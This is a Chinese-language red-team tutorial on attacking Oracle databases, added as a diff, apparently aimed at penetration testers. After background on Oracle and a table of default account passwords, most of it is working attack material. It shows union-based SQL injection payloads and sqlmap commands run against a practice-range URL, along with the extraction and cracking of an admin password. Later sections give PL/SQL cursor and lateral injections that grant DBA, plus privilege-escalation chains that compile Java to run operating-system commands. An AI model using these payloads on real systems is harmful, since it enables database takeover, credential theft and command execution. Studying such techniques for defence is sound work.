@@ -1,0 +1,898 @@
+Oracle 是最流行的关系型数据库，与此同时也是甲骨文公司的主数据库产品。我们在渗透过程中碰到的 JSP 站点大部分都会搭配 Oracel
+数据库，因此它也是红队攻防中最常遇到的数据库之一。
+
+## 0x01 Oracle简介
+
+### 数据库介绍
+
+Oracle 数据库是甲骨文公司提供的以分布式数据库为核心的软件产品。目前 Oracle
+数据库主要存在四个版本，分别是企业版、标准版、易捷版、Lite版，企业版提供了所有功能；标准版提供了基本功能；易捷版免费且轻量；Lite版专为移动设备设计。作为甲骨文公司的核心数据库产品，它的优点如下：
+
+    
+    
+    1、Oracle数据库拥有完整的数据管理功能，其中包括数据的可靠性、共享性、大量性以及保存的持久性。
+    2、Oracle数据库是完备关系的产品，具备信息准则、保证访问准则、视图更新准则、数据物理性和逻辑性独立准则
+    3、Oracle数据库有分布式处理功能，目前已拥有完善的分布式数据库功能，同时 Oracle 能够轻松实现数据仓库的操作。
+    
+
+Oracle 的所有文件都是二进制编码后的文件，对数据库算法效率有极大的提高；同时由于 Oracle 文件管理的统一性，能对 SQL
+执行过程解析优化并制定统一的标准，通过优化器的选择和无敌的 HINT 规则，给与了SQL优化极大的自由，因此 Oracle
+主要应用在传统行业的数据化业务中，比如银行、金融这些对可用性、健壮性、安全性、实时性要求极高的业务，或是零售、物流这种对海量数据存储分析要求很高的业务，而且因为
+Oracle 数据库对复杂计算、统计分析的强大分析，在互联网数据分析、数据挖掘方面也有广阔应用。
+
+### 数据库构成
+
+Oracle 数据库实际上就是一个数据的物理存储系统，其中包括数据文件、控制文件、参数文件、联机日志等。提到 Oracle 数据库不得不提到 Oracle
+实例，一个操作系统只有一个 Oracle 数据库，但是可以安装多个 Oracle 实例，一个 Oracle
+实例则对应着一系列后台进程和内存结构。而实例和数据库是有区别的，如果想要访问数据库，就必须将数据库文件加载到实例当中，它们之间的区别如下：
+
+  * 实例是临时的，它只在相关进程和内存合集存在时存在；但数据库是永久存在的。
+
+  * 一个实例只能对应一个数据库；但是一个实例可以由多个实例对应。
+
+因此 Oracel 为了区分实例和数据库，使用了 SID 和服务名这两个概念，SID就是用来表示唯一实例的，服务名则直接对应数据库。Oracle
+数据文件是数据存储的物理单位，其中的数据都是存储在表空间内，表空间是 Oracle 对物理数据库文件的逻辑映射，一个 Oracle
+数据库在逻辑上被分为若干个表空间，如果数据库用户讲表中的数据放到表空间中，表空间会随机将数据放入一个或多个数据文件当中，用户通过表查询数据，而不是直接对数据文件或表空间进行查询。  
+![1](https://image.3001.net/images/20220906/1662426830_63169ecea4a614fdd4e7d.png!small)
+
+Oracle 数据库存在五个默认表空间，分别是 SYSTEM、SYSAUX、UNDOTBS1、TEMP、USERS，其中 SYSTEM
+表空间中存储了数据字典以及默认的索引和集群，数据字典中包含了所有数据库中用户对象信息的表，用于存储系统表和管理配置等基本信息；SYSAUX 表空间中是
+SYSTEM 表的一个辅助空间表，主要存放一些系统附加信息，用来降低 SYSTEM 表的负载；TEMP
+表空间是一个临时表空间，用于存储SQL语句处理的表和索引信息；UNDOTBS1 表空间用于存储撤销的信息。
+
+### 角色与权限
+
+Oracle 存在多个默认用户，其默认密码如下表所示：
+
+用户名 / 密码| 登录身份| 说明  
+---|---|---  
+sys/change_on_install| SYSDBA 或 SYSOPER| 不能以 NORMAL 登录，可作为默认的系统管理员  
+system/manager| SYSDBA 或 NORMAL| 不能以 SYSOPER 登录，可作为默认的系统管理员  
+sysman/oem_temp| sysman| 为 oms 的用户名  
+scott/tiger| NORMAL| 普通用户  
+aqadm /aqadm| SYSDBA 或 NORMAL| 高级队列管理员  
+dbsnmp/dbsnmp| SYSDBA 或 NORMAL| 复制管理员  
+  
+Oracle 权限分为系统权限和实体权限，其区别如下：
+
+  * 系统权限：系统规定用户使用数据库的权限。（针对用户而言）
+
+  * 实体权限：某种权限用户对其他用户的表或视图的存取权限。（针对表或视图而言）
+
+系统权限也就是常说的角色，分别为 DBA、CONNECT、RESOURCE，
+
+  * DBA: 拥有全部特权，即系统最高权限，只有该角色才能够创建数据库结构
+
+  * RESOURCE: 只能创建实体，不可以创建数据库结构
+
+  * CONNECT: 只能登录数据库，不可以创建实体以及数据库结构
+
+实体权限则包括如下：
+
+    
+    
+    select, update, insert, alter, index, delete, all  //all包括所有权限
+    execute  //执行存储过程权限
+    
+
+当权限发生传递时，如果使用 WITH ADMIN OPTION
+为某个用户授予系统权限，那么对于被这个用户授予相同权限的所有用户来说，取消该用户的系统权限不会级联取消这些用户的相同权限，而对于使用 WITH GRANT
+OPTION 授予权限的用户来说，同样会这些用户的权限，也就是说是级联取消的。
+
+在 Oracle 中可以创建角色
+
+    
+    
+    CREATE ROLE role_name;
+    
+
+授予、撤销角色/用户权限，常用权限包括`select`、`delete`、`insert`、`create`等
+
+    
+    
+    CREATE system_privilege|all privileges TO role_name;
+    CREATE system_privilege|all privileges TO user_name;
+    CREATE obj_privilege|all ON obj_name TO role_name;
+    CREATE obj_privilege|all ON obj_name TO user_name;
+    REVOKE obj_privilege|all FROM role_name;
+    REVOKE obj_privilege|all FROM user_name;
+    
+
+创建用户 Oracle 数据库用户
+
+    
+    
+    CREATE USER user_name IDENTIFIED BY password;
+    
+
+给用户分配、撤销角色
+
+    
+    
+    GRANT role_name TO user_name;
+    SELECT * FROM user_role_privs; ##查看权限
+    SELECT t.DEFAULT_ROLE from user_role_privs t where t.granted_role = 'DBA'; ##查看DBA用户权限
+    
+
+删除角色
+
+    
+    
+    DROP ROLE role_name;
+    
+
+## 0x02 Oracle安装与连接
+
+### Oracle安装配置
+
+#### Windows下安装
+
+点击 Oracle Database 11g 安装包开始安装  
+![截屏2021-09-24
+上午3.40.21](https://image.3001.net/images/20220906/1662426831_63169ecfda621f4329366.png!small)  
+选择创建和配置数据库  
+![截屏2021-09-24
+上午3.40.35](https://image.3001.net/images/20220906/1662426833_63169ed120892bf69e0a6.png!small)  
+选择桌面类进行安装  
+![截屏2021-09-24
+上午3.40.52](https://image.3001.net/images/20220906/1662426834_63169ed22b11ba257798e.png!small)  
+默认开启 sys 和 system 账号，设置管理口令为hacker1961  
+![截屏2021-09-24
+上午3.41.55](https://image.3001.net/images/20220906/1662426835_63169ed34f7fdbf631513.png!small)
+
+数据库安装完成  
+![截屏2021-09-25
+上午5.30.06](https://image.3001.net/images/20220906/1662426836_63169ed481f0f95ece3ac.png!small)
+
+### Oracle连接
+
+#### Windows下连接
+
+在本地通过 sqldeveloper 登录，选择进入客户端  
+![截屏2021-09-25
+上午5.40.35](https://image.3001.net/images/20220906/1662426837_63169ed583b1b6fd95df5.png!small)
+
+配置用户名、密码、默认 SID 后点击连接  
+![截屏2021-09-25
+上午5.45.53](https://image.3001.net/images/20220906/1662426838_63169ed69697b1e3c9288.png!small)
+
+成功登录数据库  
+![截屏2021-09-26
+上午1.16.20](https://image.3001.net/images/20220906/1662426839_63169ed79ff0ac9efcda8.png!small)
+
+命令行登录如下：
+
+    
+    
+    su - oracle //切换oracle用户
+    sqlplus / as dba或sysdba //以dba或sysdba用户登录
+    
+
+如果需要远程连接，需配置数据库的环境变量为`D:\app\macos\product\11.2.0\dbhome_1\NETWORK\ADMIN下打开listener.ora`  
+![截屏2021-09-26
+上午1.34.05](https://image.3001.net/images/20220906/1662426841_63169ed9273a07a485c35.png!small)
+
+设置`HOST`的IP是本地网卡的IP地址
+
+    
+    
+    D:\app\macos\product\11.2.0\dbhome_1\BIN
+    
+
+![截屏2021-09-26
+上午1.35.14](https://image.3001.net/images/20220906/1662426842_63169eda2a5c0651f34db.png!small)
+
+重启 oraclelistener 服务  
+![截屏2021-09-26
+上午2.14.18](https://image.3001.net/images/20220906/1662426843_63169edb58914eade391a.png!small)
+
+启动 lsnrctl 并查看状态
+
+    
+    
+    lsnrctl start
+    lsnrctl status
+    lsnrctl stop
+    
+
+![截屏2021-09-26
+上午2.18.21](https://image.3001.net/images/20220906/1662426844_63169edc7fc3e75a66b7b.png!small)
+
+**参考地址：https://blog.csdn.net/wangshuai6707/article/details/40039987**
+
+#### Linux下连接
+
+在 Linux 中连接 Oracle 多使用 sqlplus、Navicat 等管理工具，以 navicat 远程连接为例：  
+![截屏2021-09-26
+上午2.20.28](https://image.3001.net/images/20220906/1662426845_63169eddb5a459f603ac7.png!small)
+
+当然也可以通过 sqlplus 命令行连接
+
+    
+    
+    sqlplus system/Hacker1961@192.168.0.108:1521/orcl as sysdba //用于临时连接
+    
+
+#### navicat连接报错：ora-12737
+
+在通过 Navicat 时出现以下报错信息，该问题的主要原因是数据库、操作系统、navicat的版本位数都需要是32位或64位  
+![QQ截图20210927150526](https://image.3001.net/images/20220906/1662426847_63169edf2905a08e383c5.png!small)
+
+解决方法：Navicat 的工具 > 选项的环境中切换 OCI library 中选择oci.dll  
+**下载地址：https://blog.mn886.net/ZBlogFile/ueditor/jsp/upload/file/20140620/1403230281541023016.zip**
+
+#### navicat连接报错：library is not loaded
+
+在通过 Navicat 时出现以下报错信息：  
+![QQ截图20210927151237](https://image.3001.net/images/20220906/1662426848_63169ee0304c1a2ec6cd1.png!small)
+
+解决方法：下载 SQL Developer 连接安装进行登录  
+![QQ截图20210927151818](https://image.3001.net/images/20220906/1662426849_63169ee114e8232195ebc.png!small)
+
+## 0x03 Oracle基础用法
+
+### 基础操作
+
+通过以下两类注释符可完成注释
+
+    
+    
+    单行注释：-- 空格 
+    多行注释：/* */ 
+    
+
+查询当前数据库的基本信息
+
+    
+    
+    select * from session_roles ##查看当前用户权限
+    select user from dual ##查看当前用户
+    select banner from sys.v_$version where rownum=1 ##查看当前数据库版本
+    select utl_http.request from dual ##查看服务器出口IP
+    select utl_inaddr.get_host_address from dual ##查看服务器物理地址
+    select instance_name from v$instance ##查看服务器实例名-e即sid
+    select name from v$database
+    select SYS_CONTEXT('USERENV','CURRENT_USER') from dual 查询当前连接用户
+    
+
+大部分 Oracle 数据库的增删改查与 MySQL 类似，但仍然存在一些差别，由于 Oracle 对列的类型比较严谨，使用 null
+可以匹配任意类型，数据库中存在 dual 表，它是一个单行单列的虚拟表，通常使用它读取基础的数据库信息，下面是一些与 MySQL 存在差异的语句
+
+    
+    
+    select username from all_users by username ##列出所有用户
+    select username from dba_users where account_status = 'OPEN' ##列出所有已启用的dba用户
+    select DISTINCT from all_tables ##列出数据库
+    select owner,table_name from all_tables ##列出表名、所有者
+    select column_name from all_tab_columns where table_name='ADMIN' ##查询表所有列
+    select member from v$logfile where rownum=1 ##查看服务器操作系统日志存放位置
+    select name from V$DAT AFILE //定位文件
+    
+
+但需要注意的一点是 Oracle 数据库不支持堆叠注入
+
+## 0x04 Oracle渗透
+
+### SQL注入获取信息
+
+#### 本地演示
+
+Oracel的联合查询与MSSQL类似，一般通过 null 来填充，首先查询当前实例名
+
+    
+    
+    select * from HELP where SEQ=-1 union select null,null,(select name from v$database) from dual;
+    
+
+![截屏2022-08-04
+04.42.54](https://image.3001.net/images/20220906/1662426850_63169ee2716268859416b.png!small)
+
+从总表中查询第一个表名
+
+    
+    
+    select * from HELP where SEQ=-1 union select null,null,(select table_name from user_tables where rownum=1) from dual;
+    
+
+![截屏2022-08-04
+04.45.32](https://image.3001.net/images/20220906/1662426852_63169ee40e829bdffd3a1.png!small)
+
+排除第一个表名来获取第二个表名，以此类推
+
+    
+    
+    select * from HELP where SEQ=-1 union select null,null,(select table_name from user_tables where rownum=1 and table_name <> 'AQ$_INTERNET_AGENTS') from dual;
+    
+
+![截屏2022-08-04
+04.47.01](https://image.3001.net/images/20220906/1662426853_63169ee57203afd5055b7.png!small)
+
+获取表中第一个字段
+
+    
+    
+    select * from HELP where SEQ=-1 union select null,null,(select column_name from user_tab_columns where table_name='AQ$_INTERNET_AGENTS' and rownum=1) from dual;
+    
+
+![截屏2022-08-04
+04.48.56](https://image.3001.net/images/20220906/1662426854_63169ee6ab148a2620494.png!small)
+
+排除第一个字段来获取第二个字段，以此类推
+
+    
+    
+    select * from HELP where SEQ=-1 union select null,null,(select column_name from user_tab_columns where table_name='AQ$_INTERNET_AGENTS' and rownum=1 and column_name <> 'AGENT_NAME') from dual;
+    
+
+![截屏2022-08-04
+04.49.49](https://image.3001.net/images/20220906/1662426856_63169ee809142566e860b.png!small)
+
+#### 注入利用
+
+以墨者靶场为例，漏洞地址如下：
+
+    
+    
+    http://124.70.22.208:45204/new_list.php?id=1
+    
+
+![截屏2022-08-03
+01.48.26](https://image.3001.net/images/20220906/1662426857_63169ee976137af28159f.png!small)
+
+通过单引号判断注入，返回不同界面说明存在注入
+
+    
+    
+    /new_list.php?id=1'
+    
+
+![截屏2022-08-03
+01.49.25](https://image.3001.net/images/20220906/1662426858_63169eeadced6f5002d0a.png!small)
+
+通过 order by 报错情况判断当前字段数为2
+
+    
+    
+    /new_list.php?id=1 order by 2
+    
+
+![截屏2022-08-03
+01.50.31](https://image.3001.net/images/20220906/1662426860_63169eec4a7c39dbaca00.png!small)
+
+    
+    
+    /new_list.php?id=1 order by 3
+    
+
+![截屏2022-08-03
+01.50.14](https://image.3001.net/images/20220906/1662426861_63169eedb98005c73c8b7.png!small)
+
+通过 union select 判断回显位置，由于不知道数据类型，因此使用 null 来代替
+
+    
+    
+    /new_list.php?id=-1 union select null,null from dual
+    
+
+![截屏2022-08-03
+01.57.21](https://image.3001.net/images/20220906/1662426863_63169eef0b9c241e812da.png!small)
+
+使用字符串依次替换 null，确定回显位置
+
+    
+    
+    /new_list.php?id=-1 union select 'null','null' from dual
+    
+
+![截屏2022-08-03
+01.57.38](https://image.3001.net/images/20220906/1662426864_63169ef033efae502e794.png!small)
+
+获取数据库基础信息，包括当前数据库用户、数据库版本、数据库名等
+
+    
+    
+    /new_list.php?id=-1 union select (select user from dual),(select banner from sys.v_$version where rownum=1) from dual
+    /new_list.php?id=-1 union select (select name from v$database),(select instance_name from v$instance) from dual
+    
+
+![截屏2022-08-03
+01.59.52](https://image.3001.net/images/20220906/1662426865_63169ef19dad62c61a2b2.png!small)  
+![截屏2022-08-03
+02.02.49](https://image.3001.net/images/20220906/1662426866_63169ef2e1a70be1d8599.png!small)
+
+获取表名，通过排除法以此类推直至拿到全部表名
+
+    
+    
+    /new_list.php?id=-1 union all select null,(select table_name from user_tables where rownum=1) from dual
+    /new_list.php?id=-1 union all select null,(select table_name from user_tables where rownum=1 and table_name<>'LOGMNR_SESSION_EVOLVE$') from dual
+    /new_list.php?id=-1 union all select null,(select table_name from user_tables where rownum=1 and table_name<>'LOGMNR_SESSION_EVOLVE$' and table_name<>'LOGMNR_GLOBAL$') from dual
+    
+
+![截屏2022-08-03
+02.10.43](https://image.3001.net/images/20220906/1662426868_63169ef441a3acb2c5729.png!small)  
+![截屏2022-08-03
+02.13.49](https://image.3001.net/images/20220906/1662426869_63169ef5a5ac0bc3e5fac.png!small)  
+![截屏2022-08-03
+02.14.49](https://image.3001.net/images/20220906/1662426870_63169ef6d59c38d6096e6.png!small)
+
+但是表是在是太多了，使用 sqlmap 进行注入获取当前库名
+
+    
+    
+    sqlmap -u "http://124.70.22.208:45204/new_list.php?id=1" --dbms=oracle --current-db
+    
+
+经筛选后拿到表`SNS_USERS`
+
+    
+    
+    sqlmap -u "http://124.70.22.208:45204/new_list.php?id=1" --dbms=oracle -D SYSTEM --tables
+    
+
+![截屏2022-08-03
+02.29.55](https://image.3001.net/images/20220906/1662426872_63169ef82d64a286a96f0.png!small)
+
+获取表`sns_users`列名，通过排除法以此类推直至拿到全部列名，分别为USER_NAME、USER_PWD
+
+    
+    
+    /new_list.php?id=-1 union all select null,(select column_name from user_tab_columns where table_name='sns_users' and rownum=1) from dual
+    /new_list.php?id=-1 union all select null,(select column_name from user_tab_columns where table_name='sns_users' and rownum=1 and column_name<>'USER_NAME') from dual
+    
+
+![截屏2022-08-03
+02.32.37](https://image.3001.net/images/20220906/1662426873_63169ef95b0a929de99fb.png!small)  
+![截屏2022-08-03
+02.34.24](https://image.3001.net/images/20220906/1662426874_63169efaca7cf7503b28c.png!small)
+
+查询关键信息，成功拿到账号密码`mozhe/bd99228230c82c2f0447ad759591aca1`
+
+    
+    
+    /new_list.php?id=-1 union all select USER_NAME,USER_PWD from "sns_users"
+    /new_list.php?id=-1 union all select USER_NAME,USER_PWD from "sns_users" where USER_NAME<>'zhong'
+    /new_list.php?id=-1 union all select USER_NAME,USER_PWD from "sns_users" where USER_NAME<>'zhong' and USER_NAME<>'hu'
+    
+
+![截屏2022-08-03
+02.38.54](https://image.3001.net/images/20220906/1662426876_63169efc7f28c7181006d.png!small)  
+![截屏2022-08-03
+02.40.22](https://image.3001.net/images/20220906/1662426877_63169efdcd4aaddc1790f.png!small)  
+![截屏2022-08-03
+02.41.04](https://image.3001.net/images/20220906/1662426879_63169eff1a6204aa5ad41.png!small)
+
+破解哈希值为676100  
+![截屏2022-08-03
+02.42.01](https://image.3001.net/images/20220906/1662426880_63169f00c974adf3c3446.png!small)
+
+使用`mozhe/676100`登录后台  
+![截屏2022-08-03
+02.43.04](https://image.3001.net/images/20220906/1662426882_63169f0256c587f2185b5.png!small)
+
+### PL/SQL注入
+
+PL/SQL也是一种程序语言，即过程化SQL语言，PL/SQL是 Oracle
+公司在标准SQL语言的基础上进行扩展，在原有的SQL语言的使用上增加了编程语言的特点，可以类似程序语言JAVA一样实现逻辑判断、条件循环、异常处理等细节操作，从而实现处理复杂的功能或计算的程序。常用用途如下：
+
+  * 创建存储过程
+
+  * 创建函数
+
+  * 创建触发器
+
+  * 创建对象
+
+不过需要注意的是PL/SQL的执行权限非常重要，因此需要提到`AUTHID CURRENT_USER`：
+
+    
+    
+    1、如果使用 AUTHID CURRENT_USER 关键词创建，那么在它执行时会调用者（invoker）的权限来执行
+    2、如果没有使用 AUTHID CURRENT_USER 关键词，那么它在执行时会以它的定义者（definer）的权限来执行
+    
+
+#### Cursor注入
+
+以下这个 procedure 由DBA（SYS）创建并赋予了 public 执行权限，也就是说数据库能让所有用户调试这个
+procedure，由于没有申明AUTHID CURRENT_USER，所以该存储进程执行时的权限是其定义者（definer），也就是SYS
+
+    
+    
+    CONNECT / AS SYSDBA;
+    
+    CREATE OR REp/l/aCE PROCEDURE GET_OWNER (P_OBJNM VARCHAR) IS 
+    TYPE C_TYPE IS REF CURSOR; 
+    CV C_TYPE; 
+    BUFFER VARCHAR2(200); 
+    BEGIN DBMS_OUTPUT.ENABLE(1000000); 
+    OPEN CV FOR 'SELECT OWNER FROM ALL_OBJECTS WHERE OBJECT_NAME = ''' || P_OBJNM ||''''; 
+    LOOP FETCH CV INTO BUFFER; 
+    DBMS_OUTPUT.PUT_LINE(BUFFER); 
+    EXIT WHEN CV%NOTFOUND; 
+    END LOOP; 
+    CLOSE CV; 
+    END; 
+    /
+    
+    GRANT EXECUTE ON GET_OWNER TO PUBLIC;
+    
+
+![截屏2022-08-05
+02.46.32](https://image.3001.net/images/20220906/1662426885_63169f0560ce7f0ec90f9.png!small)
+
+很明显 P_OBJNM 存在SQL注入，但由于 Oracle 数据库不支持堆叠查询，因此只能使用联合查询来获取数据
+
+    
+    
+    set serveroutput on;
+    exec SYS.GET_OWNER('AAA''union select PASSWORD from SYS.DBA_USERS --');
+    
+
+可以创建一个执行其他命令的函数（需要 CREATE PROCEDURE权限）并追加 AUTHID
+CURRENT_USER，然后将函数注入到SQL语句中，当SQL语句以SYS权限执行时，这个被注入的函数作为SQL语句的一部分也会被执行
+
+    
+    
+    CREATE OR REp/l/aCE FUNCTION GET_DBA RETURN VARCHAR AUTHID 
+    CURRENT_USER IS 
+    PRAGMA AUTONOMOUS_TRANSACTION; 
+    BEGIN 
+    EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC'; 
+    RETURN 'GOT_DBA_PRIVS'; 
+    END; 
+    /
+    
+    exec SYS.GET_OWNER('AAA''||TEST5.GET_DBA --');
+    
+
+在这里的GET_DBA函数被称为辅助注入函数，如果我们没有办法自己创建注入函数的话，就需要寻找oracle上已经存在的、可以辅助注入的函数
+
+ **参考网址1：https://www.t00ls.net/articles-23609.html**  
+ **参考网址2：http://www.davidlitchfield.com/HackingAurora.pdf**
+
+#### Lateral注入
+
+这是 Oracle SQL注入的另一种利用手法，与我们通常理解的web或代理层面的SQL注入不太一样，主要针对以下两种情况：
+
+  * Procedure不接收用户输入的参数（参数不可控）
+
+  * Procedure中SQL语句拼接的参数被定义为NUMBER或DATA类型
+
+先看下面的存储过程，它接收一个日期类型的参数，并将参数动态拼接到SQL语句中
+
+    
+    
+    create or rep/l/ace procedure date_proc_2 (p_date DATE) is 
+    stmt varchar2(200); 
+    begin 
+    stmt:='select object_name from all_objects where created = ''' || p_date || ''''; dbms_output.put_line(stmt); 
+    execute immediate stmt; 
+    end; 
+    /
+    
+
+先来尝试注入
+
+    
+    
+    exec date_proc_2('11''||TEST5.GET_DBA --');
+    
+
+通常这种情况下可能被认为无注入，但如果我们拥有Alter
+SESSION权限的话，就可以欺骗PL/SQL编译器将任意SQL语句作为日期类型（其实该功能原来是用来修改日期类型格式的）
+
+    
+    
+    ALTER SESSION SET NLS_DATE_FORMAT = '"'' and TEST6.GET_DBA()=1--"';
+    
+    然后注入获取DBA
+    exec SYS.date_proc_2(''' and TEST6.GET_DBA()=1--');
+    set role; 
+    
+
+再来看一下这样一个存储过程，它不接收任何参数，拼接入SQL语句中的参数骢sysdate中获取
+
+    
+    
+    create or rep/l/ace procedure date_proc is 
+    stmt varchar2(200); 
+    v_date date:=sysdate; 
+    begin 
+    stmt:='select object_name from all_objects where created = ''' || v_date || ''''; dbms_output.put_line(stmt); 
+    execute immediate stmt; 
+    end; 
+    /
+    
+
+故技重施，去污染date参数
+
+    
+    
+    select SYSDATE from dual;
+    
+    ALTER SESSION SET NLS_DATE_FORMAT = '"THIS IS A SINGLE QUOTE ''"'; 
+    select SYSDATE from dual;
+    
+
+可以看到成功添加了一个单引号进去，此时我们再去执行上面的Procedure，那么会得到一个单引号未正常闭合的报错
+
+    
+    
+    exec SYS.DATE_PROC();
+    
+
+那么我们是否能够将语句成功注入进去呢？答案是暂时还不行，因为date类型限制了长度
+
+    
+    
+    ALTER SESSION SET NLS_DATE_FORMAT = '"THIS IS A SINGLE QUOTE ''aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"';
+    
+
+但是oracle有个游标（可以理解为给你的语句一个ID，执行的时候直接通过ID执行即可），正好可以被利用  
+ **游标参考文章：https://www.cnblogs.com/huyong/archive/2011/05/04/2036377.html**
+
+    
+    
+    set serveroutput on;
+    
+    DECLARE 
+    N NUMBER; 
+    BEGIN N:=DBMS_SQL.OPEN_CURSOR(); 
+    DBMS_SQL.PARSE(N,'DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN 
+    EXECUTE IMMEDIATE ''GRANT DBA TO TEST5''; END;',0); 
+    DBMS_OUTPUT.PUT_LINE('Cursor is: '|| N); 
+    END; 
+    /
+    
+
+**注：需要开启输出，不然无法打印游标号**
+
+污染date参数进而实现SQL注入：
+
+    
+    
+    ALTER SESSION SET NLS_DATE_FORMAT = '"'' AND DBMS_SQL.EXECUTE(1)=1--"';
+    
+    再次执行
+    Procedure exec SYS.DATE_PROC();
+    
+
+### 权限提升
+
+对于 Oracle 这种大型、多账号体制的数据库来说，如果能够通过低权限提权拿下整个服务器，这将是渗透测试的重大突破。而 Oracle 提权漏洞集中存在于
+PL/SQL 编写的函数、存储过程、包、触发器中，一个重要的原因是 PL/SQL
+定义的两种调用权限导致（定义者权限和调用者权限），定义者权限给了低权限用户在特定时期高权限的可能，这也就给提权操作奠定了基础。因此无论定义者权限如何执行存储过程的结果权限永远为定义者权限，如果一个较高权限的用户定义了存储过程，并赋予了低权限用户调用权限，那么较低权限的用户可利用这个存储过程提权。
+
+Java 作为 Oracle
+公司的主打语言，具有内置的安全性机制和高效的垃圾收集系统，同时它还具有一组非常强大的、丰富的标准库，从而能够更快、更低成本地开发应用程序，因此 Oracle
+数据库也同样支持 Java 来编写存储过程。对于攻击者而言，可以利用这一特性在系统上执行 Java 代码，从而完成提权操作，在 Oracle 10g、11g
+版本中，存在一些存储过程可用于提权。
+
+#### DBMS_EXPORT_EXTENSION
+
+该软件包存在许多易受 PL/SQL 注入攻击的函数，这些函数由 SYS 拥有，作为 SYS 执行并且可由 PUBLIC 执行，因此攻击者可调用该函数并执行
+SYS 查询。它作为输出扩展功能包，其中存在三个危险函数，分别是
+get_domain_index_metadata、get_v2_domain_index_tables、get_domain_index_tables，它们都是以
+sys 权限定义，默认低权限用户可以调用。
+
+  * 影响版本：Oracle Database <= 10g R2
+
+以 get_domain_index_tables 为例创建 Java 库
+
+    
+    
+    select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or rep/l/ace and compile java source named "LinxUtil" as import java.io.*;public class LinxUtil extends Object {public static String runCMD(String args){try{BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--','SYS',0,'1',0) from dual
+    
+
+赋予 Java 权限
+
+    
+    
+    select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual
+    
+
+创建 Java 函数
+
+    
+    
+    select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or rep/l/ace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual
+    
+
+赋予函数执行权限
+
+    
+    
+    select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual
+    
+
+执行命令
+
+    
+    
+    select sys.LinxRunCMD('/bin/bash -c /usr/bin/whoami') from dual
+    
+
+#### 创建Java函数
+
+  * 影响版本：Oracle Database <= 11g
+
+  * 利用条件：DBA权限
+
+赋予当前用户 JAVA 权限
+
+    
+    
+    begin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete' );end;
+    /
+    
+
+创建 Java 代码
+
+    
+    
+    create or rep/l/ace and compile java source named exe_linux as
+    import java.io.BufferedReader;
+    import java.io.InputStream;
+    import java.io.InputStreamReader;
+    import java.net.UnknownHostException;
+    public class Test
+    {
+    public static String list_cmd(String str){
+        Runtime runtime=Runtime.getRuntime();
+      StringBuffer enco = new StringBuffer();
+      enco.append("GBK");
+      try{
+      Process proc =runtime.exec(str);
+      InputStream inp_suc=proc.getInputStream();
+      InputStream inp_err=proc.getErrorStream();
+      BufferedReader bfr_err = new BufferedReader(new InputStreamReader(inp_err,enco.toString()));
+      BufferedReader bfr_suc = new BufferedReader(new InputStreamReader(inp_suc,enco.toString()));
+        String strLine;
+          while( (strLine=(bfr_suc.readLine())) != null){
+         
+          System.out.println(strLine);
+              }
+      while( (strLine=(bfr_err.readLine())) != null){
+         
+        System.out.println(strLine);
+        }
+            proc.destroy();
+            inp_suc.close();
+            inp_err.close();
+        }catch (Exception e) {
+          System.out.println("EXECUTE IS ERROR!");
+          System.out.println(e.getMessage());
+        }
+        return "";
+      }
+         
+      /* public static void main(String[] args){
+         
+          list_cmd(args[0]);
+        }
+        **/
+    }
+    
+    /
+    
+
+创建存储过程
+
+    
+    
+    create or rep/l/ace procedure p_exe_linux(str varchar2) as language java
+    name 'Test.list_cmd(java.lang.String)';
+    /
+    
+
+执行命令
+
+    
+    
+    SET SERVEROUTPUT ON
+    exec dbms_java.set_output(1111111111111);
+    EXEC P_EXE_LINUX('whoami');
+    
+
+#### DBMS_JAVA.RUN_JAVA
+
+  * 影响版本：Oracle Database <= 11g
+
+  * 利用条件：Java 权限
+
+赋予当前用户 Java 权限
+
+    
+    
+    DECLARE
+    POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
+    CURSOR C1 IS SELECT 
+    'GRANT',USER(),'SYS','java.io.FilePermission',
+    '<<ALL FILES>>','execute','ENABLED' FROM DUAL;
+    BEGIN
+    OPEN C1;
+    FETCH C1 BULK COLLECT INTO POL;
+    CLOSE C1;
+    DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
+    END;
+    /
+    
+
+执行命令创建文件、反弹shell
+
+    
+    
+    SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper touch /tmp/success') FROM DUAL;
